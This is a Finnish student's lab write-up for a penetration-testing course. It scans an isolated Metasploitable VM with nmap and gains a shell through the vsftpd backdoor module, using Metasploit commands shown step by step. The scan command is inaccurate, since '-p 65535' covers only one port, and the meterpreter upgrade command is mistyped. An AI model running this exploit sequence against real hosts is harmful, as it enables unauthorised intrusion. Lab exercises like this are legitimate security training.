# h2 Lisää vain vesi

## x) Tiivistelmä

### Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit

- Metasploitilla exploitatessa valitaan payload, exploit ja kohde
- Meterpreter on suosittu, koska se menee välimuistiin ja on monipuolinen, toimii taustalla
- Metasploitin etuja: Open source, tallentuvat tietokannat, fiksut payloadit.
- Voi ajaa useita sessioita samaan aikaan

## a) Koneet käyntiin

Käynnistin molemmat koneet Virtualboxista Host only-adapterilla, ja testasin että ne eivät saa yhteyttä internettiin, mutta saavat yhteydet toisiinsa.

<img width="474" height="89" alt="Näyttökuva 2025-09-01 123214" src="https://github.com/user-attachments/assets/863e3a35-9c32-4ed8-983a-aa4ad249eec7" />

<img width="821" height="452" alt="Näyttökuva 2025-09-01 123223" src="https://github.com/user-attachments/assets/d55007d1-6447-40f0-84fc-55d354b4092e" />

<img width="540" height="59" alt="Näyttökuva 2025-09-01 123241" src="https://github.com/user-attachments/assets/7df6bf0c-4b8d-4336-9bd4-a1969edb987a" />

<img width="804" height="156" alt="Näyttökuva 2025-09-01 123258" src="https://github.com/user-attachments/assets/5cf6a024-d031-4597-b52b-d9937cd4fee3" />

## b) Metasploit käyntiin

Kali Linuxilla on jo MSFconsole valmiina, joten komennot ovat:

    $ sudo msfdb init
    $ sudo msfconsole

## c) Etsi Metasploitable ja tarkista, että ip on oikein

    $ db_nmap -sn 192.168.57.1-255

<img width="857" height="744" alt="Näyttökuva 2025-09-01 123807" src="https://github.com/user-attachments/assets/47347353-e9ab-4dd1-9e47-fdbf62697155" />

Oikea IP löytyi.

## d) Perusteellinen skannaus

Skannataan kaikki Metasploitablen portit komennolla

    db_nmap -T4 -A -p 65535 192.168.57.4

## e) Tulokset

Ja tarkastellaan tuloksia (services)

<img width="1167" height="750" alt="Näyttökuva 2025-09-01 124100" src="https://github.com/user-attachments/assets/b4239ec7-4835-4e79-b13a-cbb9939d64d8" />

(hosts)

<img width="1180" height="314" alt="Näyttökuva 2025-09-01 124251" src="https://github.com/user-attachments/assets/c12d18ab-f041-4659-a410-04b729c62df5" />

## f)

## g) Murtaudu Metasploitableen

    search vsftpd
    use 1
    setg RHOSTS 192.168.57.4
    show options
    exploit

Näillä komennoilla pääsin melko vaivattomasti sisään Metasploitableen 21 portin kautta.

<img width="1415" height="1218" alt="Näyttökuva 2025-09-01 131206" src="https://github.com/user-attachments/assets/32c11dc4-79bc-45c9-83bd-9ed86dc58df6" />

## h) Päivitä meterpreteriin

Poistutaan sessiosta ja päivitetään se

    CTRL + Z
    session -u -1

## Loput tehtävät

Valitettavasti aloitin tämän tehtävän tekemisen niin myöhään, että en ehtinyt tehdä loppuja tehtäviä ennen kuin läksy piti palauttaa.

## Lähteet

Karvinen 2025: [Tunkeutumistestaus](https://terokarvinen.com/tunkeutumistestaus/#h2-lisaa-vain-vesi)

Jaswal 2020: [Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit](https://www.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31)
